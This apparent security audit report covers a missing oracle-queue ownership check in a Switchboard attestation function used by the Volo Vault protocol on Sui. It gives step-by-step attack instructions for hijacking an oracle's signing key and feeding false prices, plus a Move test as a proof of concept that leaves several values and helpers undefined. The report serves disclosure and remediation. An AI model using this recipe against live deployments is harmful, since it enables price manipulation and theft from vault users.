# Audit Report

## Title
Missing Oracle-Queue Relationship Validation Enables Oracle Hijacking

## Summary
The `validate()` function in `oracle_attest_action` fails to verify that the Oracle being attested belongs to the provided Queue, allowing attackers to hijack legitimate oracles by attesting them through malicious queues with controlled guardians. This enables complete control over oracle cryptographic keys, allowing submission of fraudulent price data to the Volo Vault protocol.

## Finding Description

The vulnerability exists in the `oracle_attest_action::validate()` function which only validates that guardians belong to the queue's guardian queue, but fails to validate that the oracle being attested belongs to the provided queue parameter. [1](#0-0) 

The function validates the guardian-queue relationship: [2](#0-1) 

However, it never checks that `oracle.queue() == queue.id()` or that `oracle.queue_key() == queue.queue_key()`. Other actions in the codebase correctly implement this validation. For comparison, `queue_override_oracle_action` validates both relationships: [3](#0-2) 

Similarly, `aggregator_submit_result_action` validates the oracle-queue relationship: [4](#0-3) 

The entry point is publicly accessible without authority checks: [5](#0-4) 

When sufficient attestations are collected, the oracle's cryptographic keys are overwritten with attacker-controlled values: [6](#0-5) 

This overwrites the oracle's `secp256k1_key` and `mr_enclave` fields: [7](#0-6) 

**Attack Execution:**
1. Attacker creates malicious Queue B with controlled guardians (permissionless via `guardian_queue_init_action` and `oracle_queue_init_action`)
2. Attacker calls `oracle_attest_action::run()` multiple times with victim Oracle A (belongs to legitimate Queue A), their malicious Queue B, and their controlled guardians
3. Validation passes because guardians belong to Queue B's guardian queue, but no check verifies Oracle A belongs to Queue B
4. Attestations accumulate on Oracle A from Queue B's guardians
5. Once threshold is reached, Oracle A's cryptographic keys are replaced with attacker's keys
6. Attacker can now sign price updates that pass validation in `aggregator_submit_result_action`

## Impact Explanation

**Critical: Oracle Hijacking and Price Manipulation**

The attacker gains complete control over legitimate oracle cryptographic keys, enabling:

1. **Arbitrary Price Data Submission**: When aggregators verify price submissions, they validate signatures against the oracle's stored key. Since this key is now attacker-controlled, malicious price data will pass validation: [8](#0-7) 

2. **Volo Vault Compromise**: The Volo Vault relies on these Switchboard aggregators for critical pricing: [9](#0-8) 

3. **Protocol-Wide Impact**: Manipulated prices lead to:
   - Incorrect vault valuations affecting all user shares
   - Loss tolerance bypass through fake price updates
   - Unauthorized profit extraction via price manipulation
   - Cascading failures across integrated DeFi protocols (Navi, Suilend, Cetus, Momentum)

## Likelihood Explanation

**High Likelihood**

1. **Permissionless Entry Points**: Both queue and oracle creation are permissionless public functions: [10](#0-9) [11](#0-10) 

2. **Accessible Victim Oracles**: Oracles are shared objects, making them accessible as mutable references in any transaction

3. **Low Attack Cost**: Only requires gas fees for queue/guardian creation

4. **High Attack Benefit**: Complete control over oracle pricing enables significant value extraction from vault operations

## Recommendation

Add oracle-queue relationship validation to the `validate()` function in `oracle_attest_action`, consistent with other actions:

```move
public fun validate(
    oracle: &mut Oracle,
    queue: &Queue,
    guardian: &Oracle,
    timestamp_seconds: u64,
    mr_enclave: vector<u8>,
    secp256k1_key: vector<u8>,
    signature: vector<u8>,
    clock: &Clock,
) {
    // ... existing checks ...
    
    // ADD THESE VALIDATIONS:
    assert!(queue.queue_key() == oracle.queue_key(), EInvalidQueueKey);
    assert!(queue.id() == oracle.queue(), EInvalidQueueId);
    
    // ... rest of function ...
}
```

## Proof of Concept

```move
#[test]
fun test_oracle_hijacking_via_malicious_queue() {
    use sui::test_scenario;
    use sui::clock;
    
    let admin = @0x1;
    let attacker = @0x2;
    let mut scenario = test_scenario::begin(admin);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Setup: Create legitimate Queue A with Oracle OA
    let legitimate_queue_key = x"aaaa";
    let legitimate_guardian_queue = create_guardian_queue(&mut scenario, legitimate_queue_key);
    let legitimate_queue = create_oracle_queue(&mut scenario, legitimate_queue_key, legitimate_guardian_queue);
    let victim_oracle = create_oracle(&mut scenario, x"oracle_a", legitimate_queue);
    
    // Attack: Attacker creates malicious Queue B with controlled guardians
    test_scenario::next_tx(&mut scenario, attacker);
    let malicious_queue_key = x"bbbb";
    let malicious_guardian_queue = create_guardian_queue(&mut scenario, malicious_queue_key);
    let malicious_queue = create_oracle_queue(&mut scenario, malicious_queue_key, malicious_guardian_queue);
    
    let malicious_guardian1 = create_oracle(&mut scenario, x"guard_1", malicious_guardian_queue);
    let malicious_guardian2 = create_oracle(&mut scenario, x"guard_2", malicious_guardian_queue);
    let malicious_guardian3 = create_oracle(&mut scenario, x"guard_3", malicious_guardian_queue);
    
    // Attack: Attest victim oracle using malicious guardians
    let attacker_key = x"attacker_secp_key";
    oracle_attest_action::run(
        &mut victim_oracle,
        &malicious_queue,
        &malicious_guardian1,
        timestamp_seconds,
        mr_enclave,
        attacker_key,
        signature1,
        &clock
    );
    
    oracle_attest_action::run(
        &mut victim_oracle,
        &malicious_queue,
        &malicious_guardian2,
        timestamp_seconds,
        mr_enclave,
        attacker_key,
        signature2,
        &clock
    );
    
    oracle_attest_action::run(
        &mut victim_oracle,
        &malicious_queue,
        &malicious_guardian3,
        timestamp_seconds,
        mr_enclave,
        attacker_key,
        signature3,
        &clock
    );
    
    // Verify: Oracle's key has been replaced with attacker's key
    assert!(victim_oracle.secp256k1_key() == attacker_key, 0);
    assert!(victim_oracle.queue() == legitimate_queue.id(), 1); // Still points to legitimate queue
    
    // Impact: Attacker can now sign price updates that will pass validation
    // because aggregator_submit_result_action checks signature against oracle.secp256k1_key()
}
```

### Citations

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L43-93)
```text
public fun validate(
    oracle: &mut Oracle,
    queue: &Queue,
    guardian: &Oracle,
    timestamp_seconds: u64,
    mr_enclave: vector<u8>,
    secp256k1_key: vector<u8>,
    signature: vector<u8>,
    clock: &Clock,
) {

    // check the queue version
    assert!(queue.version() == EXPECTED_QUEUE_VERSION, EInvalidQueueVersion);

    // check the oracle version
    assert!(oracle.version() == EXPECTED_ORACLE_VERSION, EInvalidOracleVersion);
    
    // check the guardian version
    assert!(guardian.version() == EXPECTED_ORACLE_VERSION, EInvalidOracleVersion);

    // check that guardian queue (for the target queue) is the guardian's queue
    assert!(guardian.queue() == queue.guardian_queue_id(), EInvalidGuardianQueue);

    // check that the guardian is valid
    assert!(oracle.expiration_time_ms() > clock.timestamp_ms(), EGuardianInvalid);

    // check that the signature is valid length
    assert!(signature.length() == 65, EWrongSignatureLength);

    // check that the timestamp is a maximum of 10 minutes old (and not in the future)
    assert!(timestamp_seconds * 1000 + ATTESTATION_VALIDITY_MS >= clock.timestamp_ms(), ETimestampInvalid);
    
    // check that signature maps to the guardian, and that the guardian is valid
    let oracle_key = oracle.oracle_key();
    let queue_key = oracle.queue_key();
    let attestation_msg = hash::generate_attestation_msg(
        oracle_key,
        queue_key,
        mr_enclave,
        x"0000000000000000000000000000000000000000000000000000000000000000",
        secp256k1_key,
        timestamp_seconds,
    );

    // recover the guardian pubkey from the signature
    let recovered_pubkey_compressed = ecdsa_k1::secp256k1_ecrecover(&signature, &attestation_msg, 1);
    let recovered_pubkey = ecdsa_k1::decompress_pubkey(&recovered_pubkey_compressed);

    // check that the recovered pubkey is valid
    assert!(hash::check_subvec(&recovered_pubkey, &guardian.secp256k1_key(), 1), EInvalidSignature);
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L121-123)
```text
    if (valid_attestations >= queue.min_attestations()) {
        let expiration_time_ms = clock.timestamp_ms() + queue.oracle_validity_length_ms();
        oracle.enable_oracle(secp256k1_key, mr_enclave, expiration_time_ms);
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L135-164)
```text
public entry fun run(
    oracle: &mut Oracle,
    queue: &Queue,
    guardian: &Oracle,
    timestamp_seconds: u64,
    mr_enclave: vector<u8>,
    secp256k1_key: vector<u8>,
    signature: vector<u8>,
    clock: &Clock,
) {
    validate(
        oracle,
        queue,
        guardian,
        timestamp_seconds,
        mr_enclave,
        secp256k1_key,
        signature,
        clock,
    );
    actuate(
        oracle,
        queue,
        guardian,
        timestamp_seconds,
        mr_enclave,
        secp256k1_key,
        clock,
    );
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/queue/queue_override_oracle_action.move (L40-41)
```text
    assert!(queue.queue_key() == oracle.queue_key(), EInvalidQueueKey);
    assert!(queue.id() == oracle.queue(), EInvalidQueueId);
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/aggregator/aggregator_submit_result_action.move (L60-60)
```text
    assert!(oracle.queue() == aggregator.queue(), EAggregatorQueueMismatch);
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/aggregator/aggregator_submit_result_action.move (L91-91)
```text
    assert!(hash::check_subvec(&recovered_pubkey, &oracle.secp256k1_key(), 1), ERecoveredPubkeyInvalid);
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/schemas/oracle.move (L113-122)
```text
public(package) fun enable_oracle(
    oracle: &mut Oracle, 
    secp256k1_key: vector<u8>,
    mr_enclave: vector<u8>,
    expiration_time_ms: u64,
) {
    oracle.secp256k1_key = secp256k1_key;
    oracle.mr_enclave = mr_enclave;
    oracle.expiration_time_ms = expiration_time_ms;
}
```

**File:** volo-vault/sources/oracle.move (L250-262)
```text
public fun get_current_price(config: &OracleConfig, clock: &Clock, aggregator: &Aggregator): u256 {
    config.check_version();

    let now = clock.timestamp_ms();
    let current_result = aggregator.current_result();

    let max_timestamp = current_result.max_timestamp_ms();

    if (now >= max_timestamp) {
        assert!(now - max_timestamp < config.update_interval, ERR_PRICE_NOT_UPDATED);
    };
    current_result.result().value() as u256
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/queue/guardian_queue_init_action.move (L60-84)
```text
public entry fun run(
    queue_key: vector<u8>,
    authority: address,
    name: String,
    fee: u64,
    fee_recipient: address,
    min_attestations: u64,
    oracle_validity_length_ms: u64,
    ctx: &mut TxContext
) {   
    validate(
        min_attestations,
        oracle_validity_length_ms,
    );
    actuate(
        queue_key,
        authority,
        name,
        fee,
        fee_recipient,
        min_attestations,
        oracle_validity_length_ms,
        ctx,
    );
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_init_action.move (L50-64)
```text
public entry fun run(
    oracle_key: vector<u8>,
    queue: &mut Queue,
    ctx: &mut TxContext
) {   
    validate(
        &oracle_key,
        queue,
    );
    actuate(
        queue,
        oracle_key,
        ctx,
    );
}
```
